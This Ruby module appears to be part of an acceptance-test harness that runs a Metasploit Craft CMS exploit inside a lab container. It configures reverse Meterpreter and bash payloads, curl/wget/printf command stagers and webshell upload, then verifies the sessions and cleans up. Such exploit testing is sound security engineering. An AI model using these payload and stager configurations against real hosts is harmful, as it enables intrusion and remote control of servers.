# frozen_string_literal: true

require_relative '../rsync_creds/native'
require_relative '../inetutils_telnet/prerequisites'
require_relative 'php_prerequisite'
require 'English'
require 'fileutils'
require 'rex/exploitation/cmdstager'

# Native Craft state, real owner execution and persisted session evidence.
module CraftTarget
  include RsyncCredentialTarget
  include InetutilsPrerequisites
  include CraftPhpPrerequisite

  CONFIG = JSON.parse(File.read(File.join(__dir__, 'releases.json'))).freeze

  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'craftcms.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def rc_command(label, role, *, required: true)
    super(label, role == 'linux' ? 'app' : role, *, required: required)
  end

  def it_expected_uid
    CONFIG.fetch('expected_uid')
  end

  def cc_install_payload_runtime
    requested = ENV['CRAFT_PHP_RUNTIME_SOURCE']
    return if requested.to_s.empty?

    source = File.expand_path(requested)
    bytes = File.binread(source)
    raise ArgumentError, 'Expected a nonempty PHP Meterpreter source file' unless bytes.include?('<?php') && bytes.include?('CONFIG_BLOCK')

    config = rc_json('Msf::Config.config_directory')
    expect(config).to eq(File.join(target_runtime.fetch('artifacts'), 'msf-config'))
    path = File.join(config, 'payloads', 'meterpreter', 'meterpreter.php')
    raise ArgumentError, 'The isolated payload override already exists' if File.exist?(path) || File.symlink?(path)

    # Use the supported per-config data override, preserving the installed gem.
    FileUtils.mkdir_p(File.dirname(path))
    File.binwrite(path, bytes)
    actual = rc_json("{path:MetasploitPayloads.path('meterpreter','meterpreter.php'),sha256:Digest::SHA256.hexdigest(MetasploitPayloads.read('meterpreter','meterpreter.php'))}")
    expect(actual).to eq('path' => path, 'sha256' => Digest::SHA256.hexdigest(bytes))
    @rc[:payload_runtime_variant] = actual.merge('requested_source' => source, 'kind' => 'explicit_php_source_override', 'stock_qualification' => false)
    rc_save
  end

  def cc_native_stager(flavor, arch)
    bytes = File.binread(File.join(target_runtime.fetch('artifacts'), "native-exit#{arch}"))
    directory = "/tmp/module-target-craft-native-#{Process.pid}-#{flavor}"
    output, = rc_command('native-stager-path', 'app', 'python3', '-c', 'import json,sys;from pathlib import Path;print(json.dumps(Path(sys.argv[1]).exists()))', directory)
    expect(JSON.parse(output)).to be(false)
    rc_command('native-stager-mkdir', 'app', 'mkdir', directory)
    directory_created = true
    generator = { 'printf' => Rex::Exploitation::CmdStagerPrintf, 'bourne' => Rex::Exploitation::CmdStagerBourne }.fetch(flavor)
    commands = generator.new(bytes).generate(temp: directory.dup, nodelete: true, noconcat: true)
    commands.each_with_index do |command, index|
      output, status = rc_command('native-' + flavor, 'app', 'sh', '-c', command, required: false)
      expect(status).to eq(index == commands.length - 1 ? 42 : 0), output
    end
    code = "import hashlib,json,os,subprocess,sys;from pathlib import Path;files=list(Path(sys.argv[1]).iterdir());matches=[p for p in files if p.is_file()and hashlib.sha256(p.read_bytes()).hexdigest()==sys.argv[2]];assert len(matches)==1;exe=matches[0];result=subprocess.run([str(exe)],timeout=3);print(json.dumps({'uid':os.geteuid(),'exit':result.returncode,'sha256':hashlib.sha256(exe.read_bytes()).hexdigest()}))"
    output, = rc_command('native-stager-execute', 'app', 'python3', '-c', code, directory, Digest::SHA256.hexdigest(bytes))
    result = JSON.parse(output)
    expect(result).to eq('uid' => it_expected_uid, 'exit' => 42, 'sha256' => Digest::SHA256.hexdigest(bytes))
    @rc[:native_stagers] ||= []
    @rc[:native_stagers] << { flavor: flavor, arch: arch, commands: commands, result: result }
    rc_save
  ensure
    if directory_created
      code = 'import sys;from pathlib import Path;directory=Path(sys.argv[1]);[path.unlink()for path in directory.iterdir()];directory.rmdir()'
      rc_command('native-stager-remove', 'app', 'python3', '-c', code, directory)
    end
  end

  def rc_resource_roles
    %w[app reporting_db]
  end

  def cc_native(phase)
    output, status = rc_command(phase + '-native', 'app', 'python3', '/opt/module-target/native.py', @profile_name, 'audit', required: false)
    data = JSON.parse(output)
    @rc.fetch(:native) << { phase: phase, data: data }
    rc_save
    expect(status).to eq(0), data.fetch('checks').reject { |row| row.fetch('passed') }.inspect
    expect(data.fetch('checks').length).to eq(17)
    expect(data.fetch('passed')).to be(true)
    data
  end

  def cc_snapshot
    output, = rc_command('snapshot', 'app', 'python3', '/opt/module-target/native.py', @profile_name, 'snapshot')
    JSON.parse(output)
  end

  def it_file(path)
    output, = rc_command('proof-file', 'app', 'python3', '/opt/module-target/proof_inspection.py', 'file', path)
    JSON.parse(output)
  end

  def cc_process(pid)
    output, = rc_command('callback-process', 'app', 'python3', '/opt/module-target/proof_inspection.py', 'process', pid.to_s)
    JSON.parse(output)
  end

  def cc_port
    socket = TCPServer.new(@rc.fetch(:callback).fetch(:bind), 0)
    socket.local_address.ip_port
  ensure
    socket&.close
  end

  def cc_tcp(port)
    code = "import json,sys;rows=[line.split()for line in open('/proc/net/tcp').read().splitlines()[1:]];print(json.dumps([{'state':r[3],'uid':int(r[7])}for r in rows if int(r[2].split(':')[1],16)==int(sys.argv[1])]))"
    output, = rc_command('callback-sockets', 'app', 'python3', '-c', code, port.to_s)
    JSON.parse(output)
  end

  def cc_call(label, options = {}, action: 'run -z', reuse: false)
    owner = CONFIG.fetch('owner')
    offset = rc_json('framework.instance_variable_get(:@craft_events).length')
    record = { label: label, options: options, action: action }
    @rc.fetch(:calls) << record
    values = {
      'TARGET' => 1, 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => 'true', 'SSL' => false,
      'COMMAND' => 'passthru', 'AutoCheck' => true, 'ForceExploit' => false,
      'AllowNoCleanup' => true, 'DisablePayloadHandler' => true, 'WfsDelay' => 0,
      'WEBSHELL' => "module-target-craft-owner-#{Process.pid}-#{label}.php"
    }.merge(options)
    unless reuse
      console_command('back')
      expect(console_command('use ' + owner)).not_to match(/Failed to load|Unknown command|No results/)
    end
    # Re-selecting an unchanged target needlessly runs payload auto-selection.
    target = values.delete('TARGET')
    current = rc_json("active_module.datastore['TARGET'].to_i")
    console_command("set TARGET #{target}") unless current == target
    payload = values.delete('PAYLOAD')
    console_command('set PAYLOAD ' + payload)
    command = values.delete('CMD')
    if %w[cmd/unix/generic php/exec].include?(payload)
      expect(rc_json("begin;active_module.datastore['CMD']=#{command.inspect};active_module.datastore['CMD'];end")).to eq(command)
      record[:configured_command_base64] = Base64.strict_encode64(command.b)
    end
    output = run_target_module(owner, 'app', values, action: action, reuse_module: true, allow_errors: true, command_timeout: 120) do |text|
      record[:output_base64] = Base64.strict_encode64(text.b)
      record[:events] = rc_json("framework.instance_variable_get(:@craft_events).drop(#{offset})")
      record[:identity] = rc_json('active_module.object_id')
      record[:command_after_base64] = Base64.strict_encode64(rc_json("active_module.datastore['CMD']").to_s.b) if record[:configured_command_base64]
      rc_save
    end
    expect(output).not_to match(/Unknown datastore option|Error while running command|Call stack:|Parse error:/)
    expect(record[:command_after_base64]).to eq(record[:configured_command_base64]) if record[:configured_command_base64]
    [output, record]
  rescue Acceptance::ChildProcessTimeoutError, Acceptance::ChildProcessRecvError
    target_runtime['craft_console_failed'] = true
    record[:console_timeout] = true if record
    rc_save
    raise
  end

  def cc_check(options = {})
    _output, record = cc_call('check', options, action: 'check')
    check = record.fetch(:events).reverse.find { |event| event['method'] == 'check' && event['event'] == 'return' }.fetch('check')
    positive = @vulnerable && !options.key?('RPORT') && !options.key?('TARGETURI')
    expect(check.fetch('code')).to eq(positive ? 'appears' : 'unknown')
    expect(check.fetch('reason')).not_to be_empty
    check
  end

  def cc_canary(label, options = {}, reuse: false, content: 'craft-owner')
    path = "/tmp/module-target-craft-owner-#{Process.pid}-#{label}"
    absent = !it_file(path).fetch('exists')
    expect(absent).to be(true)
    quoted = "'" + content.gsub("'", %q{'"'"'}) + "'"
    command = "printf %s #{quoted} > #{path}"
    output, record = cc_call(label, { 'CMD' => command }.merge(options), reuse: reuse)
    positive = @vulnerable && !options.key?('RPORT') && !options.key?('TARGETURI')
    if positive
      rc_poll { it_file(path).fetch('base64') == Base64.strict_encode64(content) }
      expect(it_file(path)).to eq('exists' => true, 'uid' => it_expected_uid, 'base64' => Base64.strict_encode64(content))
      expect(output).not_to include('Exploit failed', 'Exploit aborted', 'The exploit likely failed')
      expect(record.fetch(:events)).to include(include('event' => 'return', 'method' => 'upload_webshell', 'value' => true))
    else
      expect(it_file(path).fetch('exists')).to be(false)
      expect(output).to include('Exploit aborted due to failure:')
    end
    record[:proof] = it_file(path)
    rc_save
    record
  ensure
    original_error = $ERROR_INFO
    begin
      if path && absent
        rc_command('remove-command-proof', 'app', 'rm', '-f', path)
        expect(it_file(path).fetch('exists')).to be(false)
      end
      cc_restore(record) if record
    rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
      @rc.fetch(:cleanup_errors) << { label: label, type: e.class.name, message: e.message, primary_error: original_error&.message }
      raise unless original_error
    ensure
      rc_save
    end
  end

  def cc_restore(call)
    paths = call.fetch(:events).filter_map { |event| event['webshell_path'] }.uniq
    paths.each do |path|
      expect(path).to match(%r{\A/app/web/(?:module-target-craft-owner-[a-zA-Z0-9_-]+|[a-zA-Z]{8,16})\.php\z})
      expect(@baseline.fetch('web_php_files')).not_to include(File.basename(path))
      before = it_file(path)
      rc_command('operator-webshell-cleanup', 'app', 'rm', '-f', path)
      expect(it_file(path).fetch('exists')).to be(false)
      @rc.fetch(:operator_cleanup) << { path: path, existed: before.fetch('exists'), absent: true }
    end
    rc_save
  end

  def cc_session(label, family, reuse: false)
    expect(cc_snapshot).to eq(@baseline)

    payload, type, target, arch, flavor = {
      'php' => ['php/meterpreter/reverse_tcp', 'meterpreter', 0, nil, nil],
      'bash' => ['cmd/unix/reverse_bash', 'shell', 1, nil, nil],
      'fetch-x86' => ['cmd/linux/http/x86/meterpreter_reverse_tcp', 'meterpreter', 1, 1, nil],
      'curl-x64' => ['linux/x64/meterpreter/reverse_tcp', 'meterpreter', 2, 2, 'curl'],
      'wget-x86' => ['linux/x86/meterpreter_reverse_tcp', 'meterpreter', 2, 1, 'wget'],
      'printf-x64' => ['linux/x64/meterpreter_reverse_tcp', 'meterpreter', 2, 2, 'printf'],
      'bourne-x86' => ['linux/x86/meterpreter/reverse_tcp', 'meterpreter', 2, 1, 'bourne']
    }.fetch(family)
    callback = @rc.fetch(:callback)
    port = cc_port
    expect(cc_tcp(port)).to eq([])
    options = {
      'TARGET' => target, 'PAYLOAD' => payload, 'LHOST' => callback.fetch(:host), 'LPORT' => port,
      'ReverseListenerBindAddress' => callback.fetch(:bind), 'DisablePayloadHandler' => false,
      'AllowNoCleanup' => false, 'AutoCheck' => !reuse, 'WfsDelay' => @vulnerable ? 25 : 1
    }
    # Failed connects and successful-connect/early-retire loops need separate bounds.
    options.merge!('SessionRetryTotal' => 10, 'SessionRetryWait' => 1) if type == 'meterpreter'
    # The synchronous PHP request must return before the C2 idle timeout.
    options.merge!('HttpClientTimeout' => 5, 'SessionExpirationTimeout' => 30, 'SessionCommunicationTimeout' => 15) if family == 'php'
    if family == 'fetch-x86'
      destination = "/tmp/module-target-craft-fetch-#{Process.pid}-#{port}"
      options.merge!('FETCH_COMMAND' => 'CURL', 'FETCH_SRVHOST' => callback.fetch(:host), 'FETCH_SRVPORT' => cc_port,
                     'FetchListenerBindAddress' => callback.fetch(:bind), 'FETCH_WRITABLE_DIR' => '/tmp',
                     'FETCH_FILENAME' => File.basename(destination), 'FETCH_DELETE' => true)
    elsif flavor
      directory = "/tmp/module-target-craft-dropper-#{Process.pid}-#{port}"
      code = 'from pathlib import Path;import json,sys;print(json.dumps(Path(sys.argv[1]).exists()))'
      output, = rc_command('owned-stager-directory-absent', 'app', 'python3', '-c', code, directory)
      expect(JSON.parse(output)).to be(false)
      rc_command('create-owned-stager-directory', 'app', 'mkdir', directory)
      directory_created = true
      options.merge!('CMDSTAGER::FLAVOR' => flavor, 'CMDSTAGER::TEMP' => directory,
                     'SRVHOST' => callback.fetch(:bind), 'URIHOST' => callback.fetch(:host), 'SRVPORT' => cc_port)
      # Keep large command arrays in the passive captures, outside console output.
      options['VERBOSE'] = false if %w[printf bourne].include?(flavor)
    end
    output, call = cc_call(label, options, reuse: reuse)
    unless @vulnerable
      expect(output).to include('Exploit aborted due to failure:')
      expect(rc_json('framework.sessions.keys')).to eq([])
      expect(rc_sql("SELECT count(*) FROM sessions s JOIN hosts h ON h.id=s.host_id JOIN workspaces w ON w.id=h.workspace_id WHERE w.name='#{@workspace}'").strip).to eq('0')
      return
    end
    expect(output).not_to include('Exploit failed', 'Exploit aborted', 'no session was created')
    metadata = rc_poll(45) do
      sessions = rc_json('framework.sessions.map{|id,s|{id:id,type:s.type,owner:s.via_exploit,payload:s.via_payload,db_id:s.db_record&.id}}')
      ready = File.readlines(@observer.fetch('ready_event_path')).map { |line| JSON.parse(line) }
      sessions.find { |row| row.fetch('type') == type && row['db_id'] && ready.any? { |event| event.fetch('id') == row.fetch('id') } }
    end
    expect(metadata.values_at('owner', 'payload')).to eq([CONFIG.fetch('owner'), 'payload/' + payload])
    identifier = metadata.fetch('id')
    attempt = { label: label, family: family, metadata: metadata, qualified: false }
    @rc.fetch(:session_attempts) << attempt
    rc_save
    proof = "/tmp/module-target-druid-session-#{Process.pid}_#{identifier}-#{identifier}"
    proof_absent = !it_file(proof).fetch('exists')
    expect(proof_absent).to be(true)
    if type == 'shell'
      result = rc_json("DruidSessionControl.proof(framework,#{identifier},#{proof.inspect})")
      content = 'druid-session'
    else
      channels = rc_json("framework.sessions.fetch(#{identifier}).channels.keys.sort")
      result = rc_json("begin;s=framework.sessions.fetch(#{identifier});f=nil;begin;f=s.fs.file.new(#{proof.inspect},'wb');f.write('craft-session');ensure;f.close if f;end;{pid:s.sys.process.getpid,identity:s.sys.config.getuid,api:'fs.file'};end")
      expect(rc_json("framework.sessions.fetch(#{identifier}).channels.keys.sort")).to eq(channels)
      content = 'craft-session'
    end
    expect(result).not_to have_key('error')
    rc_poll { it_file(proof).fetch('base64') == Base64.strict_encode64(content) }
    expect(it_file(proof)).to eq('exists' => true, 'uid' => it_expected_uid, 'base64' => Base64.strict_encode64(content))
    native = cc_process(result.fetch('pid'))
    expect(native).to include('exists' => true, 'uid' => it_expected_uid)
    expect(cc_tcp(port)).to include(include('state' => '01', 'uid' => it_expected_uid))
    if arch
      generated = call.fetch(:events).filter_map { |event| event['generated_exe'] }.last
      generated ||= call.fetch(:events).find { |event| event['event'] == 'delivery' }
      expect(generated).to include('sha256' => native.fetch('exe_sha256'), 'elf_class' => arch)
    else
      code = 'from pathlib import Path;import json,sys;print(json.dumps(Path("/proc",sys.argv[1],"cmdline").read_bytes().replace(b"\0",b" ").decode()))'
      output, = rc_command('native-session-command-line', 'app', 'python3', '-c', code, result.fetch('pid').to_s)
      expect(JSON.parse(output)).to include('php-fpm: pool') if family == 'php'
    end
    reports = JSON.parse(rc_sql("SELECT coalesce(json_agg(row),'[]'::json) FROM (SELECT s.id,s.stype,s.via_exploit,s.via_payload FROM sessions s JOIN hosts h ON h.id=s.host_id JOIN workspaces w ON w.id=h.workspace_id WHERE w.name='#{@workspace}') row"))
    expect(reports).to include(include('id' => metadata.fetch('db_id'), 'stype' => type, 'via_exploit' => CONFIG.fetch('owner'), 'via_payload' => 'payload/' + payload))
    record = { label: label, family: family, metadata: metadata, proof: result, native_process: native, reports: reports, port: port }
    @rc.fetch(:sessions) << record
    attempt[:qualified] = true
    rc_save
  ensure
    original_error = $ERROR_INFO
    begin
      unless target_runtime['craft_console_failed']
        if identifier
          if proof_absent
            rc_command('remove-session-proof', 'app', 'rm', '-f', proof)
            expect(it_file(proof).fetch('exists')).to be(false)
          end
          if rc_json("framework.sessions.key?(#{identifier})")
            exited = rc_json("DruidSessionControl.dispatch(framework,'exit',#{identifier})")
            attempt[:cleanup_exit] = exited
            expect(exited).not_to have_key('error') unless original_error
          end
          rc_json("begin;s=framework.sessions[#{identifier}];s.kill if s;{closed:#{identifier}};end")
          rc_poll { cc_tcp(port).none? { |row| %w[01 08].include?(row.fetch('state')) } }
          # PHP runs inside an ordinary reusable FPM worker. Its TCP session
          # must close; the server worker itself is allowed to survive.
          rc_poll { !cc_process(result.fetch('pid')).fetch('exists') } if result && family != 'php'
          closed = rc_poll { JSON.parse(rc_sql("SELECT coalesce(json_agg(row),'[]'::json) FROM (SELECT id,closed_at FROM sessions WHERE id=#{metadata.fetch('db_id')}) row")).find { |row| row['closed_at'] } }
          attempt[:closed_report] = closed
          record[:closed_report] = closed if record
        else
          remaining = rc_json('framework.sessions.keys')
          remaining.each do |session_id|
            rc_json("DruidSessionControl.dispatch(framework,'exit',#{session_id})")
            rc_json("begin;s=framework.sessions[#{session_id}];s.kill if s;{closed:#{session_id}};end")
          end
          @rc.fetch(:interrupted_session_cleanup) << { label: label, ids: remaining } unless remaining.empty?
        end
        rc_poll { !it_file(destination).fetch('exists') } if destination
        console_command('jobs -K')
        expect(rc_json('{sessions:framework.sessions.keys,jobs:framework.jobs.keys}')).to eq('sessions' => [], 'jobs' => [])
      end
      cc_restore(call) if call
      if directory_created
        code = 'from pathlib import Path;import json,sys;print(json.dumps(sorted(p.name for p in Path(sys.argv[1]).iterdir())))'
        output, = rc_command('stager-directory-after', 'app', 'python3', '-c', code, directory)
        @rc.fetch(:operator_cleanup) << { directory: directory, remaining_before_operator_cleanup: JSON.parse(output) }
        expect(JSON.parse(output)).to eq([]) unless original_error
      end
    rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
      @rc.fetch(:cleanup_errors) << { label: label, type: e.class.name, message: e.message, primary_error: original_error&.message }
      raise unless original_error
    ensure
      rc_command('remove-owned-stager-directory', 'app', 'rm', '-rf', directory) if directory_created
      rc_save
    end
  end
end
